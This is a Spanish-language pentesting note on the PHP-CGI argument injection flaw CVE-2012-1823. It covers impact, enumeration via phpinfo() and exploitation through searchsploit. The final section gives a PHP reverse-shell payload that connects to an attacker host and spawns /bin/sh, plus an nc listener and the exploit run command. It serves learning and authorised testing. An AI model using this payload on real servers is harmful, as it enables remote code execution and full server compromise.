# PHP CGI Argument Injection (CVE-2012-1823)

Las versiones antiguas de PHP presentan numerosas vulnerabilidades de seguridad que pueden derivar en divulgación de información, denegación de servicio, evasión de restricciones e incluso **ejecución remota de código (RCE)** cuando el servidor está configurado de forma vulnerable.

Uno de los casos más conocidos es **CVE-2012-1823**, una vulnerabilidad que afecta a **PHP-CGI**. Debido a un error en el tratamiento de los argumentos de línea de comandos, un atacante podía enviar parámetros especialmente construidos mediante la URL para modificar directivas de PHP en tiempo de ejecución. En determinados escenarios era posible habilitar opciones como `allow_url_include` y `auto_prepend_file`, lo que podía desembocar en la ejecución remota de código en el servidor.

**Impacto:**

* Ejecución remota de código (RCE).
* Divulgación de información.
* Compromiso completo del servidor web si el proceso de PHP posee privilegios suficientes.

**Requisitos para la explotación:**

* Uso de PHP en modo CGI.
* Versiones vulnerables sin los parches correspondientes.
* Configuración del servidor que permita el paso de argumentos a PHP-CGI.

## Enumeración

Durante la fase de reconocimiento es recomendable identificar la versión de PHP y los módulos cargados.

Una de las formas más habituales consiste en localizar una página `phpinfo()` expuesta:

```text
http://host/phpinfo.php
```

La salida de `phpinfo()` puede proporcionar información muy útil, como:

* Versión exacta de PHP.
* Sistema operativo.
* Arquitectura.
* Módulos cargados.
* Directivas de seguridad (`disable_functions`, `open_basedir`, `allow_url_include`, etc.).
* Variables de entorno.
* Rutas del sistema.
* Configuración del servidor web.

Esta información permite correlacionar la versión detectada con vulnerabilidades conocidas y determinar si el servidor puede estar expuesto a fallos publicados para esa versión.

## Explotación

Podemos buscar exploits para esta vulnerabilidad usando searchsploit:

```bash
searchsploit php cgi argument
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
PHP 5.3.12/5.4.2 - CGI Argument Injection (Metasploit)                                          | php/remote/18834.rb
PHP < 5.3.12 / < 5.4.2 - CGI Argument Injection                                                 | php/remote/18836.py
```

Para la explotación manual con python, el script está configurado por defecto para enumerar el servidor con: `<?php phpinfo();?>`. Si queremos iniciar una shell inversa debemos sustituirlo por: `<?php $sock=fsockopen("IP_kali", port_kali);exec("/bin/sh -i <&4 >&4 2>&4")?>`

```bash
nc -nvlp port_kali
python2 18836.py host.com 80
```
